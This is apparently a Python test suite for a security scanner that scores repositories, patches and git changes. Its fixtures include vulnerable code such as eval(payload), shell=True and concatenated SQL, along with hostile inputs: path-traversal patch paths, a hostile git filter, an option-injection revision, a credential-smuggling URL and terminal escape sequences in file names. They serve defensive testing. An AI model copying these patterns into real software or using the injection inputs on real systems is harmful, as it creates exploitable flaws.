        self.assertEqual(original["score"], 25)
        self.assertEqual((adjusted["score"], adjusted["grade"]), (55, "E"))
        self.assertEqual(adjusted["scoring_version"], 7)
        self.assertNotEqual(
            original["comparability"]["catalog_fingerprint"],
            adjusted["comparability"]["catalog_fingerprint"],
        )
        self.assertEqual(original["findings"], adjusted["findings"])
        self.write("app.py", "eval(payload)\n")
        self.assertEqual(run_installed()["score"], 59)
        policy["scoring"]["severity_caps"]["high"] = 69
        catalog.write_text(json.dumps(policy))
        self.assertEqual(run_installed()["score"], 69)

    def test_req07_invalid_human_scoring_edits_fail_without_score_or_traceback(self):
        import shutil

        installed = self.root / "installed-skill"
        shutil.copytree(ROOT, installed)
        catalog = installed / "rules.json"
        original = catalog.read_text()
        self.write("app.py", "eval(payload)\n")
        for field, value in (
            ("weights", {"high": 0}),
            ("weights", {"critical": 50, "high": -1, "medium": 10, "low": 3}),
            ("weights", {"critical": 50, "high": 1.5, "medium": 10, "low": 3}),
            ("severity_caps", {"critical": 39, "high": 101, "medium": 79, "low": 89}),
            ("aggregation", "average"),
            ("repetitions", "weight * (1 + ln(instances))"),
        ):
            with self.subTest(field=field, value=value):
                policy = json.loads(original)
                policy["scoring"][field] = value
                catalog.write_text(json.dumps(policy))
                result = subprocess.run(
                    [
                        sys.executable,
                        "-B",
                        str(installed / "scripts/score.py"),
                        str(self.repo),
                    ],
                    capture_output=True,
                    text=True,
                    timeout=5,
                )
                self.assertEqual(result.returncode, 1)
                self.assertEqual(result.stdout, "")
                self.assertIn("Invalid bundled rule catalog", result.stderr)
                self.assertNotIn("Traceback", result.stderr)

    def test_unknown_controls_are_not_scored_as_satisfied(self):
        self.write("app.py", "subprocess.run(command, shell=setting)\n")
        status, result, _ = self.invoke()
        self.assertEqual(status, 2)
        self.assertIsNone(result["score"])
        self.assertIsNone(result["grade"])
        self.assertEqual(result["coverage"]["check_outcomes"]["unclear"], 1)
        self.assertTrue(all(row["score"] is None for row in result["areas"]))

    def test_sparse_source_has_no_score_or_grade(self):
        self.write("main.py", "print('hello')\n")
        status, result, _ = self.invoke()
        self.assertEqual(status, 2)
        self.assertEqual(result["verdict"], "undetermined")
        self.assertIsNone(result["grade"])

    def test_missing_local_source_has_an_actionable_error(self):
        output, errors = io.StringIO(), io.StringIO()
        with contextlib.redirect_stdout(output), contextlib.redirect_stderr(errors):
            status = cli.main([str(self.repo / "missing"), "--json"])
        self.assertEqual(status, 1)
        self.assertEqual(output.getvalue(), "")
        self.assertIn(
            "Local source directory does not exist or is not accessible",
            errors.getvalue(),
        )
        self.assertNotIn("Traceback", errors.getvalue())

    def test_invalid_repository_urls_do_not_become_local_directory_errors(self):
        for url in (
            "http://github.com/example/project",
            "https://github.com/example/project/issues",
        ):
            output, errors = io.StringIO(), io.StringIO()
            with (
                self.subTest(url=url),
                mock.patch.object(
                    remote,
                    "get",
                    side_effect=AssertionError("invalid URL triggered network access"),
                ),
                contextlib.redirect_stdout(output),
                contextlib.redirect_stderr(errors),
            ):
                status = cli.main([url, "--json"])
            self.assertEqual(status, 1)
            self.assertEqual(output.getvalue(), "")
            self.assertNotIn("Local source directory", errors.getvalue())

    def test_remote_source_failure_without_evidence_has_no_numeric_score(self):
        output, errors = io.StringIO(), io.StringIO()
        listing = json.dumps(
            {
                "truncated": False,
                "tree": [
                    {
                        "path": "app.py",
                        "mode": "100644",
                        "type": "blob",
                        "sha": "b" * 40,
                        "size": 1,
                    }
                ],
            }
        ).encode()
        with (
            mock.patch.object(remote, "host_settings", return_value=([], "a" * 40)),
            mock.patch.object(remote, "get", side_effect=[(listing, 200), (None, 404)]),
            contextlib.redirect_stdout(output),
            contextlib.redirect_stderr(errors),
        ):
            status = cli.main(["https://github.com/example/project", "--json"])
        self.assertEqual(status, 1)
        result = json.loads(output.getvalue())
        self.assertEqual(result["verdict"], "incomplete")
        self.assertIsNone(result["score"])
        self.assertIsNone(result["observed_score"])
        self.assertIsNone(result["grade"])
        self.assertEqual(
            result["coverage"]["selection_limits"], {"source download failed": 1}
        )

    def test_oversized_source_has_an_actionable_compact_result(self):
        self.write("app.py", "eval(payload)\n")
        self.write("large.js", "x" * (sources.MAX_FILE + 1))
        status, result, _ = self.invoke()
        self.assertEqual(status, 1)
        self.assertIsNone(result["score"])
        self.assertEqual(cli.render(result), "59/100 (partial)")
        self.assertIn("large.js", cli.render(result, details=True))
        self.assertIn("1 file over the 512 KiB limit", cli.render(result, details=True))
        self.assertIsNone(result["grade"])

    def test_incomplete_without_evidence_does_not_invent_a_pattern_index(self):
        self.write("large.js", "x" * (sources.MAX_FILE + 1))
        status, result, _ = self.invoke()
        self.assertEqual(status, 1)
        self.assertIsNone(result["observed_score"])
        self.assertEqual(cli.render(result), "incomplete")
        self.assertNotIn("/100", cli.render(result))

    def test_incomplete_zero_pattern_index_is_displayed(self):
        self.write("app.py", "eval(payload)\nsubprocess.run(command, shell=True)\n" * 4)
        self.write("large.js", "x" * (sources.MAX_FILE + 1))
        _, result, _ = self.invoke()
        self.assertEqual(cli.render(result), "0/100 (partial)")
        self.assertIsNone(result["score"])
        self.assertIsNone(result["grade"])

    def test_comments_and_string_examples_do_not_become_findings(self):
        self.write("app.py", "# eval(payload)\nexample = 'eval(payload)'\n")
        self.write(
            "app.js",
            "// eval(payload);\nconst example = 'element.innerHTML = payload';\n",
        )
        self.assertEqual(self.invoke()[1]["findings"], [])

    def test_source_and_secret_literals_are_not_reprinted(self):
        self.write("app.py", "eval('SYNTHETIC_PRIVATE_SOURCE_MARKER')\n")
        result = self.invoke()[1]
        self.assertNotIn("SYNTHETIC_PRIVATE_SOURCE_MARKER", json.dumps(result))

    def test_supplied_patch_records_locations_and_remote_identity(self):
        patch = self.root / "change.diff"
        patch.write_text(
            "--- a/app.py\n+++ b/app.py\n@@ -10 +10 @@\n-ast.literal_eval(payload)\n+eval(payload)\n"
        )
        status, result, _ = self.invoke(
            "--patch", str(patch), "--pr", "https://github.com/example/project/pull/42"
        )
        self.assertEqual(status, 0)
        self.assertEqual(result["scope"]["kind"], "change")
        self.assertEqual(result["findings"][0]["line"], 10)
        self.assertEqual(result["findings"][0]["change"], "introduced")
        self.assertIn("remote_selection", result["scope"])
        details = cli.render(result, details=True)
        self.assertIn("https://github.com/example/project/pull/42", details)
        self.assertIn("no independent remote retrieval", details)
        self.assertFalse((self.repo / "app.py").exists())

    def test_patch_paths_cannot_read_outside_source(self):
        for path in (
            "../../private.py",
            "/private.py",
            "C:\\private.py",
            ".git/config",
        ):
            with self.subTest(path=path):
                patch = self.root / "bad.diff"
                patch.write_text(
                    f"--- a/{path}\n+++ b/{path}\n@@ -1 +1 @@\n-print(1)\n+eval(payload)\n"
                )
                status, result, errors = self.invoke("--patch", str(patch))
                self.assertEqual(status, 1)
                self.assertIsNone(result)
                self.assertNotIn("Traceback", errors)

    def test_patch_hunk_counts_are_validated(self):
        patch = self.root / "bad.diff"
        patch.write_text(
            "--- a/app.py\n+++ b/app.py\n@@ -1,2 +1,2 @@\n-print(1)\n+eval(payload)\n"
        )
        self.assertEqual(self.invoke("--patch", str(patch))[0], 1)

    def test_patch_cannot_hide_metadata_changes_behind_documentation_hunks(self):
        documentation = (
            "diff --git a/README.md b/README.md\n"
            "--- a/README.md\n+++ b/README.md\n@@ -1 +1 @@\n"
            "-Example.\n+Another example.\n"
        )
        for metadata in (
            "diff --git a/app.py b/app.py\nold mode 100644\nnew mode 100755\n",
            "diff --git a/empty.txt b/empty.txt\nnew file mode 100644\n",
            "diff --git a/old.md b/AGENTS.md\nsimilarity index 100%\n"
            "rename from old.md\nrename to AGENTS.md\n",
            "diff --git a/linked.md b/linked.md\nnew file mode 120000\n"
            "--- /dev/null\n+++ b/linked.md\n@@ -0,0 +1 @@\n+target.md\n",
            "diff --git a/run.py b/run.py\nnew file mode 100755\n"
            "--- /dev/null\n+++ b/run.py\n@@ -0,0 +1 @@\n+print(1)\n",
        ):
            for patch_text in (documentation + metadata, metadata + documentation):
                with self.subTest(
                    metadata=metadata, first=patch_text.startswith(metadata)
                ):
                    patch = self.root / "metadata.diff"
                    patch.write_text(patch_text)
                    status, result, errors = self.invoke("--patch", str(patch))
                    self.assertEqual(status, 1)
                    self.assertIsNone(result)
                    self.assertIn("local Git comparison", errors)

    def test_separate_patch_hunks_cannot_form_a_synthetic_call(self):
        patch = self.root / "change.diff"
        patch.write_text(
            "--- a/app.py\n+++ b/app.py\n@@ -1 +1 @@\n-old\n+eval(\n@@ -20 +20 @@\n-old\n+payload)\n"
        )
        result = self.invoke("--patch", str(patch))[1]
        self.assertEqual(result["findings"], [])
        self.assertNotIn("score", result)
        self.assertNotIn("grade", result)
        self.assertEqual(result["verdict"], "incomplete")
        self.assertEqual(result["relevance"], "unclear")

    def test_local_git_comparison_and_resolution(self):
        base = self.init()
        self.write("app.py", "eval(payload)\n")
        self.git("add", ".")
        self.git("commit", "--no-gpg-sign", "-m", "Introduce pattern")
        status, result, _ = self.invoke("--base", base)
        self.assertEqual(status, 0)
        self.assertEqual(result["findings"][0]["change"], "introduced")
        self.assertEqual(result["scope"]["base"], base)
        self.assertEqual(result["scope"]["head"], self.git("rev-parse", "HEAD"))
        self.assertEqual(
            self.invoke("--commit", "HEAD")[1]["findings"][0]["change"], "introduced"
        )

    def test_index_worktree_and_pre_existing_findings(self):
        self.init("eval(payload)\n")
        self.write("app.py", "eval(payload)\neval(other)\n")
        self.git("add", ".")
        staged = self.invoke("--staged")[1]
        self.assertEqual(
            Counter(f["change"] for f in staged["findings"]),
            {"pre_existing": 1, "worsened": 1},
        )
        self.write("app.py", "ast.literal_eval(payload)\n")
        unstaged = self.invoke("--unstaged")[1]
        self.assertEqual(
            Counter(f["change"] for f in unstaged["findings"]), {"resolved": 2}
        )
        self.assertEqual(unstaged["relevance"], "high")
        self.assertNotIn("score", unstaged)
        self.assertNotIn("grade", unstaged)

    def test_revision_injection_is_not_an_option(self):
        self.init()
        self.assertEqual(self.invoke("--base=--help")[0], 1)

    def test_symlinks_and_fifo_fail_closed(self):
        outside = self.root / "private.py"
        outside.write_text("eval(secret)\n")
        (self.repo / "link.py").symlink_to(outside)
        self.assertEqual(self.invoke()[0], 1)
        (self.repo / "link.py").unlink()
        if hasattr(os, "mkfifo"):
            os.mkfifo(self.repo / "fifo.py")
            self.assertEqual(self.invoke()[0], 1)

    def test_size_exclusions_keep_findings_but_withhold_grade(self):
        self.write("safe.py", "eval(payload)\n")
        self.write("large.py", "x" * (sources.MAX_FILE + 1))
        status, result, _ = self.invoke()
        self.assertEqual(status, 1)
        self.assertIsNone(result["grade"])
        self.assertEqual(len(result["findings"]), 1)

    def test_source_consistency_detects_changes(self):
        path = self.write("app.py", "eval(payload)\n")
        options = cli.parser().parse_args(["--repo", str(self.repo)])
        _, _, _, _, verify = sources.select(options, sources.Budget())
        path.write_text("ast.literal_eval(payload)\n")
        with self.assertRaises(sources.SourceError):
            verify()

    def test_untrusted_git_filter_cannot_execute(self):
        self.init()
        marker = self.root / "filter-executed"
        self.write(".gitattributes", "*.py filter=hostile\n")
        self.git("add", ".gitattributes")
        self.git("commit", "--no-gpg-sign", "-m", "Attributes")
        self.git("config", "filter.hostile.clean", f"touch {marker}")
        self.write("app.py", "eval(payload)\n")
        result = self.invoke("--unstaged")
        self.assertEqual(result[0], 0, result[2])
        self.assertFalse(marker.exists())

    def test_tool_timeout_and_output_are_bounded(self):
        with self.assertRaises(sources.SourceError):
            sources.command(
                [sys.executable, "-c", "import time; time.sleep(2)"],
                sources.Budget(0.1),
            )
        with self.assertRaises(sources.SourceError):
            sources.command(
                [sys.executable, "-c", "print('x'*10000)"], sources.Budget(), limit=1024
            )

    def test_remote_selection_needs_explicit_source_and_safe_host(self):
        for url in (
            "https://github.com/example/project/pull/42",
            "https://github.com@127.0.0.1/example/project/pull/42",
            "https://github.com/example/project/pull/42?credential=hidden",
        ):
            with self.subTest(url=url):
                self.assertEqual(self.invoke("--pr", url)[0], 1)

    def test_analyzer_never_silently_scores_change_input(self):
        with mock.patch.object(
            cli, "command", side_effect=AssertionError("Analyzer ran")
        ):
            self.assertEqual(self.invoke("--engine", "analyzer", "--staged")[0], 1)

    def test_analyzer_capabilities_and_result_identity(self):
        executable = self.root / "analyzer"
        executable.write_text("placeholder")
        executable.chmod(0o700)
        payload = {
            "verdict": "scored",
            "score": 17,
            "comparability": {"scoring_version": 2},
            "warnings": ["retained"],
            "unscored_findings": {"high": 2},
        }
        responses = [
            (0, json.dumps({"interface_version": 1}).encode()),
            (
                0,
                json.dumps(
                    {
                        "interface_version": 1,
                        "score": {
                            "available": True,
                            "model_calls": False,
                            "scoring_version": 2,
                        },
                    }
                ).encode(),
            ),
            (0, json.dumps(payload).encode()),
        ]
        with mock.patch.object(cli, "command", side_effect=responses):
            status, result, _ = self.invoke(
                "--engine", "analyzer", "--analyzer", str(executable)
            )
        self.assertEqual(status, 0)
        self.assertEqual(result["analyzer_result"], payload)
        self.assertEqual(result["grade"], "F")
        self.assertEqual(result["engine"], "analyzer")

    def test_analyzer_incompatible_or_malformed_output_never_becomes_a_score(self):
        executable = self.root / "analyzer"
        executable.write_text("isolated test placeholder")
        executable.chmod(0o700)
        version = (0, b'{"interface_version":1}')
        capability = {
            "interface_version": 1,
            "score": {"available": True, "model_calls": False, "scoring_version": 2},
        }
        for payload in (
            {
                "verdict": "scored",
                "score": True,
                "comparability": {"scoring_version": 2},
            },
            {"verdict": "scored", "score": 100, "comparability": None},
        ):
            with mock.patch.object(
                cli,
                "command",
                side_effect=[
                    version,
                    (0, json.dumps(capability).encode()),
                    (0, json.dumps(payload).encode()),
                ],
            ):
                status, result, errors = self.invoke(
                    "--engine", "analyzer", "--analyzer", str(executable)
                )
            self.assertEqual(status, 1)
            self.assertIsNone(result)
            self.assertNotIn("Traceback", errors)
        capability["score"]["model_calls"] = True
        with mock.patch.object(
            cli, "command", side_effect=[version, (0, json.dumps(capability).encode())]
        ) as command:
            status, result, _ = self.invoke(
                "--engine", "analyzer", "--analyzer", str(executable)
            )
        self.assertEqual(status, 1)
        self.assertIsNone(result)
        self.assertEqual(command.call_count, 2)

    def test_default_has_progress_and_detail_aliases_add_topic_blocks(
        self,
    ):
        self.write("app.py", "eval(payload)\n")
        for args, expected in (
            ([], "59/100 (E)\n"),
            (["--detail"], r"(?m)^Architecture\s+59/100"),
            (["--details"], r"(?m)^Architecture\s+59/100"),
        ):
            output, errors = io.StringIO(), io.StringIO()
            with contextlib.redirect_stdout(output), contextlib.redirect_stderr(errors):
                status = cli.main([str(self.repo), *args])
            self.assertEqual(status, 0)
            if args:
                self.assertRegex(output.getvalue(), expected)
                self.assertRegex(
                    output.getvalue(), r"(?m)^Authentication\s+not assessed"
                )
                self.assertIn("PY-EXEC", output.getvalue())
                self.assertIn("app.py:1", output.getvalue())
                self.assertIn("1 candidate", output.getvalue())
                self.assertNotIn("\033", output.getvalue())
                self.assertIn("Reading selected sources...", errors.getvalue())
            else:
                self.assertEqual(output.getvalue(), expected)
                self.assertIn("Reading selected sources...", errors.getvalue())
                self.assertNotIn("Categories", output.getvalue())
                self.assertNotIn("Findings", output.getvalue())

    def test_partial_category_subscores_and_findings_are_grouped_under_their_category(
        self,
    ):
        self.write("app.py", "eval(payload)\nrequests.get(url, verify=False)\n")
        self.write("unknown.js", "custom.exec(payload);\n")
        self.write("Unsupported.java", "class Unsupported {}\n")
        status, result, _ = self.invoke()
        self.assertEqual(status, 2)
        details = cli.render(result, details=True)
        execution = topic_block(details, "Architecture")
        transport = topic_block(details, "Deployment & transport")
        self.assertRegex(execution, r"^Architecture\s+59/100")
        self.assertRegex(transport, r"^Deployment & transport\s+59/100")
        self.assertEqual(details.count("(partial)"), 1)
        self.assertIn("PY-EXEC", execution)
        self.assertIn("app.py:1", execution)
        self.assertNotIn("PY-TLS", execution)
        self.assertIn("PY-TLS", transport)
        self.assertIn("app.py:2", transport)
        self.assertNotIn("PY-EXEC", transport)
        self.assertRegex(details, r"(?m)^Authentication\s+not assessed")
        self.assertIn("no repository grade is available", details)
        self.assertNotIn("score=withheld", details)
        self.assertNotIn("observed=None", details)

    def test_topic_subscores_use_area_minima_and_do_not_pool_deductions(self):
        self.write(
            "app.py", "eval(payload)\neval(other)\ncursor.execute('SELECT ' + value)\n"
        )
        self.write("safe.js", "element.textContent = payload;\n")
        self.write("compose.yaml", "services:\n  app:\n    privileged: false\n")
        _, result, _ = self.invoke()
        topics = {topic["id"]: topic for topic in reporting.subcategories(result)}
        self.assertEqual(topics["architecture"]["index"], 50)
        self.assertEqual(topics["frontend"]["index"], 100)
        self.assertEqual(topics["deployment"]["index"], 100)
        self.assertIsNone(topics["authentication"]["index"])
        self.assertEqual(
            min(
                topic["index"]
                for topic in topics.values()
                if topic["index"] is not None
            ),
            result["observed_score"],
        )
        self.assertEqual(
            sum(len(topic["findings"]) for topic in topics.values()),
            len(result["findings"]),
        )

    def test_topic_examples_are_bounded_without_dropping_findings(self):
        self.write(
            "app.py",
            "eval(payload)\nsubprocess.run(cmd, shell=True)\ncursor.execute('SELECT ' + value)\n",
        )
        self.write("script.js", "eval(payload);\n")
        _, result, _ = self.invoke()
        original = json.dumps(result, sort_keys=True)
        details = cli.render(result, details=True)
        architecture = topic_block(details, "Architecture")
        self.assertEqual(
            len(re.findall(r"(?m)^  (?:CRITICAL|HIGH|MEDIUM|LOW)\s", architecture)), 3
        )
        self.assertIn("+1 more finding types", architecture)
        self.assertEqual(len(result["findings"]), 4)
        self.assertEqual(json.dumps(result, sort_keys=True), original)
        self.assertNotIn("\nFindings\n", details)
        self.assertNotIn("Deduction", details)

    def test_topic_examples_show_positive_evidence_beside_findings(self):
        self.write("bad.js", "element.innerHTML = payload;\n")
        self.write("safe.js", "a.textContent = one;\nb.textContent = two;\n")
        self.write("app.py", "eval(payload)\n")
        self.write("data.js", "const value = JSON.parse(text);\n")
        _, result, _ = self.invoke()
        original = json.dumps(result, sort_keys=True)
        details = cli.render(result, details=True)
        frontend = topic_block(details, "Frontend")
        architecture = topic_block(details, "Architecture")
        self.assertRegex(frontend, r"^Frontend\s+79/100\s.*1 candidate")
        self.assertRegex(frontend, r"(?m)^  MEDIUM\s+.*\n.*JS-HTML . bad\.js:1$")
        self.assertRegex(
            frontend,
            r"(?m)^  OK\s+Text assigned through textContent\n.*JS-HTML . safe\.js:1 \(\+1 more\)$",
        )
        self.assertLess(frontend.index("MEDIUM"), frontend.index("  OK"))
        self.assertRegex(architecture, r"^Architecture\s+59/100")
        self.assertIn("Data-only parsing with JSON.parse", architecture)
        self.assertNotIn("Positive evidence recognized by", details)
        self.assertNotIn("No recognized control evidence", frontend)
        self.assertEqual(json.dumps(result, sort_keys=True), original)

    def test_technology_context_does_not_manufacture_authentication_or_architecture_scores(
        self,
    ):
        self.write(
            "package.json",
            '{"dependencies":{"@angular/core":"1.0.0","sequelize":"1.0.0",'
            '"bcrypt":"1.0.0","jsonwebtoken":"1.0.0"}}',
        )
        _, result, _ = self.invoke()
        details = cli.render(result, details=True)
        self.assertIsNone(result["score"])
        self.assertRegex(details, r"(?m)^Authentication\s+not assessed")
        self.assertRegex(details, r"(?m)^Architecture\s+not assessed")
        self.assertIn("Profile (context only, adds no score credit):", details)
        self.assertIn("local passwords (bcrypt), JWT (jsonwebtoken)", details)
        self.assertIn("single-page app (@angular/core)", details)
        self.assertIn("SQL (sequelize)", details)

    def test_architecture_profile_recognizes_packages_imports_and_password_input(
        self,
    ):
        self.write(
            "package.json",
            '{"dependencies":{"openid-client":"1","express-session":"1","pug":"1",'
            '"mongoose":"1","svelte":"1"}}',
        )
        self.write("routes/login.js", "\nconst { email, password } = req.body;\n")
        self.write(
            "app.py",
            "from fastapi.security import OAuth2PasswordRequestForm\n"
            "from flask import render_template\nimport psycopg2\n",
        )
        self.write(
            "views.py", "def login(request):\n    return request.form['password']\n"
        )
        self.write(
            "api.py", "def login(request):\n    request.get_json().get('passwd')\n"
        )
        architecture_result = self.invoke()[1]["architecture"]
        self.assertEqual(
            sorted(
                (row["mechanism"], row["technology"], row["file"], row.get("line"))
                for row in architecture_result["authentication"]
            ),
            [
                ("federated", "openid-client", "package.json", None),
                (
                    "local-password",
                    "fastapi.security.OAuth2PasswordRequestForm",
                    "app.py",
                    None,
                ),
                ("local-password", "password from request", "api.py", 2),
                ("local-password", "password from request", "routes/login.js", 2),
                ("local-password", "password from request", "views.py", 2),
                ("session", "express-session", "package.json", None),
            ],
        )
        self.assertEqual(
            {row["technology"] for row in architecture_result["frontend"]}, {"svelte"}
        )
        self.assertEqual(
            {row["technology"] for row in architecture_result["templates"]},
            {"pug", "flask.render_template"},
        )
        self.assertEqual(
            {
                (row["kind"], row["technology"])
                for row in architecture_result["persistence"]
            },
            {("document", "mongoose"), ("sql", "psycopg2")},
        )

    def test_architecture_profile_ignores_comments_relative_imports_and_other_keys(
        self,
    ):
        self.write(
            "a.js",
            "// const p = req.body.password;\n * req.body.password\n"
            "const p = config.password;\nconst { password } = options;\n",
        )
        self.write(
            "b.py",
            "from .jwt import decode\nfrom .db import sqlite3\n"
            "value = settings['password']\nvalue = data.get('password')\n"
            "value = request.form['username']\n",
        )
        _, result, _ = self.invoke()
        self.assertEqual(result["architecture"]["authentication"], [])
        self.assertEqual(result["architecture"]["persistence"], [])
        profile = topic_block(cli.render(result, details=True), "Architecture")
        for label in ("Authentication", "Frontend", "Persistence", "SQL queries"):
            self.assertRegex(profile, rf"(?m)^    {label}\s+none recognized$")

    def test_architecture_profile_summarizes_sql_query_construction(self):
        self.write(
            "db.py",
            "cursor.execute('SELECT 1')\ncursor.execute(query)\n"
            "cursor.execute('SELECT ' + value)\n",
        )
        self.write("db.js", "db.query(`SELECT * FROM t WHERE id = ${id}`);\n")
        _, result, _ = self.invoke()
        self.assertEqual(
            result["architecture"]["sql_queries"],
            {
                "status": "constructed",
                "calls": 4,
                "constructed": 2,
                "literal": 1,
                "unresolved": 1,
                "example": {"file": "db.js", "line": 1},
            },
        )
        self.assertIn(
            "concatenated or interpolated in 2 of 4 query calls, 1 unresolved (db.js:1)",
            cli.render(result, details=True),
        )
        self.write("db.py", "cursor.execute('SELECT 1')\n")
        self.write("db.js", "\n")
        _, result, _ = self.invoke()
        self.assertEqual(result["architecture"]["sql_queries"]["status"], "literal")
        self.assertIn(
            "literal query text in 1 query call", cli.render(result, details=True)
        )

    def test_architecture_profile_describes_only_the_proposed_side(self):
        self.init("cursor.execute('SELECT ' + value)\n")
        self.write("app.py", "cursor.execute('SELECT 1')\n")
        result = self.invoke("--unstaged")[1]
        self.assertEqual(
            result["architecture"]["sql_queries"],
            {
                "status": "literal",
                "calls": 1,
                "constructed": 0,
                "literal": 1,
                "unresolved": 0,
            },
        )

    def test_control_characters_in_architecture_profile_never_reach_the_terminal(
        self,
    ):
        self.write("db.js", "db.query(`SELECT * FROM t WHERE id = ${id}`);\n")
        _, result, _ = self.invoke()
        result["architecture"]["sql_queries"]["example"]["file"] = "evil\x1b]0;x\x07.js"
        result["architecture"]["templates"] = [
            {"technology": "pug\x9b2J", "file": "package.json"}
        ]
        details = cli.render(result, details=True)
        self.assertNotRegex(details, r"[\x00-\x09\x0b-\x1f\x7f-\x9f]")
        self.assertIn("(evil?]0;x?.js:1)", details)
        self.assertIn("server-side templates (pug?2J)", details)

    def test_incomplete_architecture_observation_has_no_profile(self):
        self.write("app.py", "eval(payload)\n")
        with mock.patch.object(cli, "describe", side_effect=cli.ScanLimit("limit")):
            _, result, _ = self.invoke()
        self.assertNotIn("sql_queries", result["architecture"])
        self.assertIn(
            "Profile unavailable: architecture observation did not complete.",
            cli.render(result, details=True),
        )

    def test_colour_only_on_a_capable_terminal_and_never_with_no_color(self):
        class Terminal(io.StringIO):
            def isatty(self):
                return True

        self.write("app.py", "eval(payload)\n")
        _, result, _ = self.invoke()
        plain = cli.render(result, details=True)
        self.assertNotIn("\033", plain)
        with mock.patch.dict(os.environ, {"TERM": "xterm"}, clear=False):
            os.environ.pop("NO_COLOR", None)
            coloured = cli.render(result, True, style.Style.detect(Terminal()))
            self.assertIn("\033[31mHIGH", coloured)
            self.assertIn(
                "\033[", cli.render(result, False, style.Style.detect(Terminal()))
            )
            os.environ["NO_COLOR"] = "1"
            self.assertEqual(
                cli.render(result, True, style.Style.detect(Terminal())), plain
            )
        with mock.patch.dict(os.environ, {"TERM": "dumb"}):
            self.assertFalse(style.Style.detect(Terminal()).color)
        self.assertFalse(style.Style.detect(io.StringIO()).color)
        self.assertEqual(re.sub(r"\033\[[0-9;]*m", "", coloured), plain)

    def test_ascii_fallback_when_the_stream_cannot_encode_glyphs(self):
        class Latin(io.StringIO):
            encoding = "ascii"

        fallback = style.Style.detect(Latin())
        self.assertFalse(fallback.unicode)
        self.write("app.py", "eval(payload)\n")
        _, result, _ = self.invoke()
        text = cli.render(result, True, fallback)
        self.assertTrue(text.isascii())
        self.assertIn("[######----]", text)

    def test_control_characters_in_repository_paths_never_reach_the_terminal(self):
        self.write("app.py", "eval(payload)\n")
        _, result, _ = self.invoke()
        for row in (*result["findings"], *result["checks"]):
            if row["file"] == "app.py":
                row["file"] = "evil\x1b]0;owned\x07\x9b2Jname.py"
        details = cli.render(result, details=True)
        self.assertNotRegex(details, r"[\x00-\x09\x0b-\x1f\x7f-\x9f]")
        self.assertIn("evil?]0;owned??2Jname.py:1", details)

    def test_topic_headers_align_scores_and_bars(self):
        self.write("app.py", "eval(payload)\n")
        _, result, _ = self.invoke()
        headers = re.findall(
            r"(?m)^(\S.*?)\s+(\d+/100)\s+([█░]{10})\s", cli.render(result, True)
        )
        self.assertEqual(len(headers), 1)
        self.assertEqual(headers[0][2], "██████░░░░")

    def test_change_details_group_signals_by_rule_without_repeating_reasons(self):
        self.init("def view(user):\n    return user.name\n")
        self.write("a.py", "token = supplied\n")
        self.write("b.py", "secret = supplied\n")
        self.write("c.md", "# Notes\n")
        _, result, _ = self.invoke("--worktree")
        details = cli.render(result, details=True)
        for rule in {row["rule"] for row in result["signals"]}:
            reason = next(
                row["reason"] for row in result["signals"] if row["rule"] == rule
            )
            self.assertEqual(" ".join(details.split()).count(reason), 1)
        self.assertNotIn('"changed_files"', details)
        self.assertRegex(details, r"(?m)^(HIGH|MEDIUM|LOW)\s+\S")
        self.assertIn("--json", details)

    def test_unmapped_future_areas_remain_visible_in_topic_scores(self):
        self.write("app.py", "eval(payload)\n")
        _, result, _ = self.invoke()
        result["areas"].append({"area": "future-boundary", "score": 39})
        topics = {topic["id"]: topic for topic in reporting.subcategories(result)}
        self.assertEqual(topics["future-boundary"]["index"], 39)

    def test_default_partial_result_has_progress_without_calculations_and_limits(self):
        self.write("app.py", "eval(payload)\n")
        self.write("large.js", "x" * (sources.MAX_FILE + 1))
        output, errors = io.StringIO(), io.StringIO()
        with contextlib.redirect_stdout(output), contextlib.redirect_stderr(errors):
            status = cli.main([str(self.repo)])
        self.assertEqual(status, 1)
        self.assertEqual(output.getvalue(), "59/100 (partial)\n")
        self.assertIn("Reading selected sources...", errors.getvalue())
        self.assertNotIn("Source coverage:", output.getvalue())

    def test_yaml_preserves_structured_result(self):
        # PyYAML is used only by this test if available, never by the runtime.
        try:
            import yaml
        except ImportError:
            self.skipTest("YAML consumer not installed")
        self.write("app.py", "eval(payload)\n")
        output = io.StringIO()
        with contextlib.redirect_stdout(output):
            status = cli.main([str(self.repo), "--yaml"])
        self.assertEqual(status, 0)
        self.assertEqual(yaml.safe_load(output.getvalue()), self.invoke()[1])

    def test_framework_names_give_no_security_credit(self):
        self.write(
            "package.json",
            '{"dependencies":{"react":"1.0.0","@angular/core":"1.0.0","pg":"1.0.0"}}',
        )
        status, result, _ = self.invoke()
        self.assertEqual(status, 2)
        self.assertIsNone(result["score"])
        self.assertEqual(
            {row["technology"] for row in result["architecture"]["frontend"]},
            {"react", "@angular/core"},
        )
        self.assertEqual(result["architecture"]["persistence"][0]["technology"], "pg")

    def test_parameterization_and_csp_are_evaluated_as_controls(self):
        self.write("db.js", "db.query('SELECT * FROM items WHERE id=$1', [id]);\n")
        self.write("view.component.html", "<p>{{value}}</p>\n")
        self.write(
            "headers.py",
            "response.headers['Content-Security-Policy'] = \"default-src 'self'; object-src 'none'; base-uri 'none'; frame-ancestors 'none'\"\n",
        )
        result = self.invoke()[1]
        self.assertEqual(result["score"], 100)
        satisfied = {
            row["rule"] for row in result["checks"] if row["status"] == "satisfied"
        }
        self.assertTrue({"JS-SQL", "FRONTEND-BINDING", "WEB-CSP"} <= satisfied)
        self.write("db.js", "db.query(`SELECT * FROM items WHERE id=${id}`);\n")
        self.assertEqual(self.invoke()[1]["score"], 59)

    def test_csp_report_only_and_example_strings_are_not_controls(self):
        self.write(
            "headers.py",
            "print('Content-Security-Policy', \"default-src 'self'; object-src 'none'; base-uri 'none'; frame-ancestors 'none'\")\n",
        )
        self.write(
            "headers.js",
            "const example = `headers['Content-Security-Policy'] = \"default-src 'self'\"`;\n",
        )
        self.assertFalse(
            any(row["status"] == "satisfied" for row in self.invoke()[1]["checks"])
        )

    def test_csp_assertions_are_not_declarations(self):
        strict = "default-src 'self'; object-src 'none'; base-uri 'none'; frame-ancestors 'none'"
        for path, text, expected in (
            (
                "headers.test.js",
                "assert.equal(res.headers['Content-Security-Policy'], \"script-src 'unsafe-inline'\")\n"
                "if (headers['Content-Security-Policy'] == \"script-src *\") {}\n",
                [],
            ),
            (
                "headers.js",
                "res.setHeader('Content-Security-Policy', \"script-src 'unsafe-inline'\");\n"
                "const list = new Headers([['Content-Security-Policy', \"script-src *\"]]);\n"
                "headers['Content-Security-Policy'] = \"default-src 'self'\";\n"
                f"res.set({{'Content-Security-Policy': \"{strict}\"}});\n",
                [(1, "violated"), (2, "violated"), (3, "unclear"), (4, "satisfied")],
